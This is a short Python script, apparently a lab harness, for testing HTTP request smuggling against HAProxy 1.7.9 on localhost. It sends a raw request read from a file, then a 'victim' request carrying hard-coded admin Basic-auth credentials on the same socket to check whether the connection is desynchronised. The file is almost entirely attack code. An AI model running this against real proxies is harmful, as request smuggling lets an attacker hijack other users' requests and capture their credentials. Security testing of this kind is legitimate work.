import socket
import time

HAPROXY_HOST = 'localhost'
HAPROXY_PORT = 8080

def read_request_from_file(filename):
    with open(filename, 'rb') as f:
        return f.read()

def attack():
    """Send request loaded from file"""
    print("\n[FILE REQUEST] Sending request from file")
    print("-" * 60)
    request = read_request_from_file('request.txt').replace(b'\n', b'\r\n')
    print(request)
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HAPROXY_HOST, HAPROXY_PORT))
        sock.sendall(request)
        
        response1 = sock.recv(4096)
        print("Attack response:")
        print(response1.decode('utf-8', errors='ignore')[:300])
        
        # Send victim request
        time.sleep(0.2)
        victim = b"GET /public HTTP/1.1\r\nHost: localhost:8080\r\nAuthorization: Basic YWRtaW46YWRtaW4xMjM=\r\n\r\n"
        sock.sendall(victim)
        
        response2 = sock.recv(4096)
        print("\nVictim response:")
        print(response2.decode('utf-8', errors='ignore')[:300])
            
        sock.close()
        return False
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def main():
    print("=" * 60)
    print("HAProxy 1.7.9 Request Smuggling Tests")
    print("=" * 60)
    
    attack()

if __name__ == "__main__":
    main()
